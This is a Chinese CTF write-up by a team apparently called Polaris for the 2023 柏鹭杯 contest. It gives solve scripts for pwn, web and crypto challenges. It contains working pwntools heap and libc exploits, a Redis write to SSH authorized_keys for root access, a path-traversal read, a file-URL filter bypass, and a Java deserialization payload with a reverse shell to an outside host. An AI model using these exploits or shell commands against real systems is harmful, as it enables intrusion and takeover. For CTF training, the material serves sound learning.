# 柏鹭杯2023 WP -Polaris战队

> 原文: https://www.ctfiot.com/139080.html
> ID: 139080

本次柏鹭杯 2023，我们Polaris战队排名第7。

01

PWN

1.

eval

#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('8.130.120.45', 32199)sh.sendline(b'+52')libc_addr = int(sh.recvline()) - 0x24083success('libc_addr: ' + hex(libc_addr))sh.sendline(f'+54-{libc_addr + 0x52290}'.encode())sh.recvline()sh.sendline(f'+53-{libc_addr + 0x0000000000054310}'.encode())sh.recvline()sh.sendline(f'+52-{libc_addr + 0x1b45bd}'.encode())sh.recvline()sh.sendline(f'+51-{libc_addr + 0x0000000000023b6a}'.encode())sh.recvline()sh.sendline()
sh.interactive()

2.

heap

#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('8.130.120.45', 20199)
def add(size):    sh.sendlineafter(b'> ', b'1')    sh.sendlineafter(b'size: ', str(size).encode())
def delete(index):    sh.sendlineafter(b'> ', b'2')    sh.sendlineafter(b'index: ', str(index).encode())
def edit(index, data):    sh.sendlineafter(b'> ', b'3')    sh.sendlineafter(b'index: ', str(index).encode())    sh.sendafter(b'data: ', data)
def show(index):    sh.sendlineafter(b'> ', b'4')    sh.sendlineafter(b'index: ', str(index).encode())
add(0x20)add(0x20)add(0x20)add(0x20)delete(1)edit(0, b'a' * 0x31)show(0)sh.recvuntil(b'a' * 0x31)guard = u64(b'0' + sh.recvn(7))success('guard: ' + hex(guard))edit(0, b'a' * 0x40)show(0)sh.recvuntil(b'a' * 0x40)heap_addr = u64(sh.recvn(6) + b'00')success('heap_addr: ' + hex(heap_addr))libc_addr = heap_addr + 0xfff50success('libc_addr: ' + hex(libc_addr))edit(0, b'a' * 0x30 + p64(guard) + b'a' * 0x10 + p64(heap_addr+0x2ed5f0-0x28))add(0x20)add(0x20)edit(4, flat([0xfbad3887, 0, 0, 0, libc_addr + 0x1f2570, libc_addr + 0x1f2578, libc_addr + 0x1f2578, libc_addr + 0x1f2578]))image_addr =  u64(sh.recvn(8)) - 0x609success('image_addr: ' + hex(image_addr))
delete(1)edit(0, b'a' * 0x31)show(0)sh.recvuntil(b'a' * 0x31)guard = u64(b'0' + sh.recvn(7))success('guard: ' + hex(guard))edit(0, b'a' * 0x30 + p64(guard) + b'a' * 0x10 + p64(image_addr+0x2031E8-0x28))add(0x20)add(0x20)edit(5, p64(image_addr + 0xEAD))delete(1)
sh.interactive()

02

RE

1.

rev_imm

03

WEB

1.

综合7

在前面通过读取配置文件，可以获得以下信息。

这里面存在一个redis的服务器，给出了端口号和密码

../../../../usr/local/share/application.properties

ssh-keygen -t rsa #生成公私钥
(echo -e "nn";cat /root/.ssh/id_rsa.pub;echo -e "nn")>key.txt #写入
cat /root/.ssh/key.txt | proxychains4 redis-cli -h 172.25.0.10 -p 62341  -a de17cb1cfa1a8e8011f027b416775c6a -x set xqq  
proxychains redis-cli -h 172.25.0.10 -p 62341 -a de17cb1cfa1a8e8011f027b416775c6a
config set dir /root/.ssh
config set dbfilename authorized_keys
save
proxychains ssh -i id_rsa root@172.25.0.10

2.

综合题6

package com.example.demo;
import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.util.Base64;
public class Test {    public static void main(String[] args) throws IOException {        Ping ping = new Ping();        ping.setCommand("/bin/bash");        ping.setArg1("-c");        ping.setArg2("bash -i >& /dev/tcp/n1ght.cn/5555 0>&1");        ByteArrayOutputStream bao = new ByteArrayOutputStream();        new ObjectOutputStream(bao).writeObject(ping);        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));
    }}

反弹shell后

suid提权dig读取文件

3.

express js

直接读main.js

flag被waf了，原题

poc:

?file[href]=aa&file[origin]=aa&file[protocol]=file:&file[hostname]=&file[pathname]=%2566lag.txt

4.

综合5

import base64
enc_flag1 = "UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA=="O0O = "6925cc02789c1d2552b71acc4a2d48fd"

def decrypt(encrypted, key):    # Step 1: Base64 decode the encrypted flag    decoded_bytes = base64.b64decode(encrypted)    decoded_str = decoded_bytes.decode('utf-8')
    decrypted = []
    # Step 2: XOR decryption    for i in range(len(decoded_str)):        decrypted_char = chr(ord(decoded_str[i]) ^ ord(key[i % len(key)]))        decrypted.append(decrypted_char)
    return ''.join(decrypted)

print(decrypt(enc_flag1, O0O))

04

Crypto

1.

rsa

num3=1.23389923415003373900567515471436168841941584796842188964423737295914869304653496800649965063081353720701415762591488370228399019899893688681309320356016722276295236528757306976510687729729934668311830828756908988350841843676900575414367123810470585198055372776278588638204471298838884740198056387082949710435502826460830711429956c = continued_fraction(num3)alist = c.convergents()for i in alist:    a = str(i).split('/')    if len(a)>1 and gcd(int(a[0]),int(a[1])) == 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(a[0]).bit_length()==512 and int(a[1]).bit_length()==512:            print(a)   #['11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693', '9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517']

得到num1，num2

然后再根据leak = pow(p-q, num1, num1*num2)求出p-q

d = inverse_mod(num1, (num1-1)*(num2-1))p_q = pow(leak,d, num1*num2) #p_q = 1031221249585875604184791796950952251782528195052531920165093585422640167920112408176595846917625510470783087032532545254805420044855275871408444733261152

p_q=1031221249585875604184791796950952251782528195052531920165093585422640167920112408176595846917625510470783087032532545254805420044855275871408444733261152n=61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673
e = 65537c = 31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393
var("p,q")eq1= p-q ==p_qeq2= p*q ==nsol = solve([eq1,eq2], p, q)print(sol)#[p == 8397652354751369475047895816963473478350245201262315191356674989898449420511844471318815750077346111978800531467822072132495108840045942922000560423170719, q == 7366431105165493870863104020012521226567717006209783271191581404475809252591732063142219903159720601508017444435289526877689688795190667050592115689909567

from Crypto.Util.number import *import gmpy2p = 8397652354751369475047895816963473478350245201262315191356674989898449420511844471318815750077346111978800531467822072132495108840045942922000560423170719q = 7366431105165493870863104020012521226567717006209783271191581404475809252591732063142219903159720601508017444435289526877689688795190667050592115689909567c=31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393e=65537m=9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517
n=61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673d=gmpy2.invert(e,(p-1)*(q-1))m=pow(c,d,n)flag=m-mprint(long_to_bytes(flag))#b'flag{ISEC-WeMu5tKe2pOn_70in5And#N3Ver@G1veUp!}'

2.

密码2

爆破出压缩包的密码为i~BgtN_Ld@sw6c9，用ARCHPR爆破得到密文数据的密码为ROT47，密文也应该rot47一下

附件中主要分析加密函数

def _l(idx, s):    return s[idx:] + s[:idx]def mainProc(p, k1, k2):    s = b"abcd07efghij89klmnopqr16stuvwxyz-_{}ABCDEFGHIJKL34MNOPQRST25VWXYZ"    t = [[_l((i+j)%len(s), s) for j in range(len(s))] for i in range(len(s))]    i1 = 0    i2 = 0    c = b""    for a in p:        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]        i1 = (i1 + 1) % len(k1)        i2 = (i2 + 1) % len(k2)    return c

发现就是一个维吉尼亚加密函数，换了表

k1和k2是同一个key的相反，根据关键加密逻辑

c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]

只需将key进行处理即可。

根据flag头可以得到key的10位

根据题目逻辑写一个回文即可

def vigeneredecode(enc,key):    mod = len(table)    flag = ''    for i in range(len(enc)):        num1 = table.index(enc[i])        num2 = table.index(key[i % len(key)])        ans = (num1 - num2) % mod        flag += table[ans]    return flagdef vigenereencode(enc,key):    mod = len(table)    flag = ''    for i in range(len(enc)):        num1 = table.index(enc[i])        num2 = table.index(key[i % len(key)])        ans = (num1 + num2) % mod        flag += table[ans]    return flag
enc = '6JnsNxHKJ8mkvhS{rMO_c9apMfHDHObq80PMu{_ww_r{rq'fleg = 'flag{ISEC-'table = "abcd07efghij89klmnopqr16stuvwxyz-_{}ABCDEFGHIJKL34MNOPQRST25VWXYZ"key = vigeneredecode(enc,fleg)[:10]print(key)key = key + key[::-1]flag = vigeneredecode(enc,key)print(flag)#flag{ISEC-Afr1en7_1nN33d_1S_Afr9end_ind88d0o0}

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:222328705

星盟安全团队纳新群2:346014666

有兴趣的师傅欢迎一起来讨论!


```
#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('8.130.120.45', 32199)sh.sendline(b'+52')libc_addr = int(sh.recvline()) - 0x24083success('libc_addr: ' + hex(libc_addr))sh.sendline(f'+54-{libc_addr + 0x52290}'.encode())sh.recvline()sh.sendline(f'+53-{libc_addr + 0x0000000000054310}'.encode())sh.recvline()sh.sendline(f'+52-{libc_addr + 0x1b45bd}'.encode())sh.recvline()sh.sendline(f'+51-{libc_addr + 0x0000000000023b6a}'.encode())sh.recvline()sh.sendline()
sh.interactive()
```



```
#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('8.130.120.45', 20199)
def add(size):    sh.sendlineafter(b'> ', b'1')    sh.sendlineafter(b'size: ', str(size).encode())
def delete(index):    sh.sendlineafter(b'> ', b'2')    sh.sendlineafter(b'index: ', str(index).encode())
def edit(index, data):    sh.sendlineafter(b'> ', b'3')    sh.sendlineafter(b'index: ', str(index).encode())    sh.sendafter(b'data: ', data)
def show(index):    sh.sendlineafter(b'> ', b'4')    sh.sendlineafter(b'index: ', str(index).encode())
add(0x20)add(0x20)add(0x20)add(0x20)delete(1)edit(0, b'a' * 0x31)show(0)sh.recvuntil(b'a' * 0x31)guard = u64(b'0' + sh.recvn(7))success('guard: ' + hex(guard))edit(0, b'a' * 0x40)show(0)sh.recvuntil(b'a' * 0x40)heap_addr = u64(sh.recvn(6) + b'00')success('heap_addr: ' + hex(heap_addr))libc_addr = heap_addr + 0xfff50success('libc_addr: ' + hex(libc_addr))edit(0, b'a' * 0x30 + p64(guard) + b'a' * 0x10 + p64(heap_addr+0x2ed5f0-0x28))add(0x20)add(0x20)edit(4, flat([0xfbad3887, 0, 0, 0, libc_addr + 0x1f2570, libc_addr + 0x1f2578, libc_addr + 0x1f2578, libc_addr + 0x1f2578]))image_addr =  u64(sh.recvn(8)) - 0x609success('image_addr: ' + hex(image_addr))
delete(1)edit(0, b'a' * 0x31)show(0)sh.recvuntil(b'a' * 0x31)guard = u64(b'0' + sh.recvn(7))success('guard: ' + hex(guard))edit(0, b'a' * 0x30 + p64(guard) + b'a' * 0x10 + p64(image_addr+0x2031E8-0x28))add(0x20)add(0x20)edit(5, p64(image_addr + 0xEAD))delete(1)
sh.interactive()
```



```
../../../../usr/local/share/application.properties
```



```
ssh-keygen -t rsa #生成公私钥
(echo -e "nn";cat /root/.ssh/id_rsa.pub;echo -e "nn")>key.txt #写入
cat /root/.ssh/key.txt | proxychains4 redis-cli -h 172.25.0.10 -p 62341  -a de17cb1cfa1a8e8011f027b416775c6a -x set xqq  
proxychains redis-cli -h 172.25.0.10 -p 62341 -a de17cb1cfa1a8e8011f027b416775c6a
config set dir /root/.ssh
config set dbfilename authorized_keys
save
proxychains ssh -i id_rsa root@172.25.0.10
```



```
package com.example.demo;
import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.util.Base64;
public class Test {    public static void main(String[] args) throws IOException {        Ping ping = new Ping();        ping.setCommand("/bin/bash");        ping.setArg1("-c");        ping.setArg2("bash -i >& /dev/tcp/n1ght.cn/5555 0>&1");        ByteArrayOutputStream bao = new ByteArrayOutputStream();        new ObjectOutputStream(bao).writeObject(ping);        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));
    }}
```



```
?file[href]=aa&file[origin]=aa&file[protocol]=file:&file[hostname]=&file[pathname]=%2566lag.txt
```



```
import base64
enc_flag1 = "UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA=="O0O = "6925cc02789c1d2552b71acc4a2d48fd"

def decrypt(encrypted, key):    # Step 1: Base64 decode the encrypted flag    decoded_bytes = base64.b64decode(encrypted)    decoded_str = decoded_bytes.decode('utf-8')
    decrypted = []
    # Step 2: XOR decryption    for i in range(len(decoded_str)):        decrypted_char = chr(ord(decoded_str[i]) ^ ord(key[i % len(key)]))        decrypted.append(decrypted_char)
    return ''.join(decrypted)

print(decrypt(enc_flag1, O0O))
```



```
num3=1.23389923415003373900567515471436168841941584796842188964423737295914869304653496800649965063081353720701415762591488370228399019899893688681309320356016722276295236528757306976510687729729934668311830828756908988350841843676900575414367123810470585198055372776278588638204471298838884740198056387082949710435502826460830711429956c = continued_fraction(num3)alist = c.convergents()for i in alist:    a = str(i).split('/')    if len(a)>1 and gcd(int(a[0]),int(a[1])) == 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(a[0]).bit_length()==512 and int(a[1]).bit_length()==512:            print(a)   #['11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693', '9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517']
```



```
d = inverse_mod(num1, (num1-1)*(num2-1))p_q = pow(leak,d, num1*num2) #p_q = 1031221249585875604184791796950952251782528195052531920165093585422640167920112408176595846917625510470783087032532545254805420044855275871408444733261152
```



```
p_q=1031221249585875604184791796950952251782528195052531920165093585422640167920112408176595846917625510470783087032532545254805420044855275871408444733261152n=61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673
e = 65537c = 31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393
var("p,q")eq1= p-q ==p_qeq2= p*q ==nsol = solve([eq1,eq2], p, q)print(sol)#[p == 8397652354751369475047895816963473478350245201262315191356674989898449420511844471318815750077346111978800531467822072132495108840045942922000560423170719, q == 7366431105165493870863104020012521226567717006209783271191581404475809252591732063142219903159720601508017444435289526877689688795190667050592115689909567
```



```
from Crypto.Util.number import *import gmpy2p = 8397652354751369475047895816963473478350245201262315191356674989898449420511844471318815750077346111978800531467822072132495108840045942922000560423170719q = 7366431105165493870863104020012521226567717006209783271191581404475809252591732063142219903159720601508017444435289526877689688795190667050592115689909567c=31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393e=65537m=9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517
n=61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673d=gmpy2.invert(e,(p-1)*(q-1))m=pow(c,d,n)flag=m-mprint(long_to_bytes(flag))#b'flag{ISEC-WeMu5tKe2pOn_70in5And#N3Ver@G1veUp!}'
```



```
def _l(idx, s):    return s[idx:] + s[:idx]def mainProc(p, k1, k2):    s = b"abcd07efghij89klmnopqr16stuvwxyz-_{}ABCDEFGHIJKL34MNOPQRST25VWXYZ"    t = [[_l((i+j)%len(s), s) for j in range(len(s))] for i in range(len(s))]    i1 = 0    i2 = 0    c = b""    for a in p:        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]        i1 = (i1 + 1) % len(k1)        i2 = (i2 + 1) % len(k2)    return c
```



```
def vigeneredecode(enc,key):    mod = len(table)    flag = ''    for i in range(len(enc)):        num1 = table.index(enc[i])        num2 = table.index(key[i % len(key)])        ans = (num1 - num2) % mod        flag += table[ans]    return flagdef vigenereencode(enc,key):    mod = len(table)    flag = ''    for i in range(len(enc)):        num1 = table.index(enc[i])        num2 = table.index(key[i % len(key)])        ans = (num1 + num2) % mod        flag += table[ans]    return flag
enc = '6JnsNxHKJ8mkvhS{rMO_c9apMfHDHObq80PMu{_ww_r{rq'fleg = 'flag{ISEC-'table = "abcd07efghij89klmnopqr16stuvwxyz-_{}ABCDEFGHIJKL34MNOPQRST25VWXYZ"key = vigeneredecode(enc,fleg)[:10]print(key)key = key + key[::-1]flag = vigeneredecode(enc,key)print(flag)#flag{ISEC-Afr1en7_1nN33d_1S_Afr9end_ind88d0o0}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/3-1697376447.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/5-1697376448.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/8-1697376448.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/4-1697376449.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/7-1697376449.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/10-1697376450.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/2-1697376451.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/7-1697376452.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/7-1697376452.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/10/1-1697376453.png)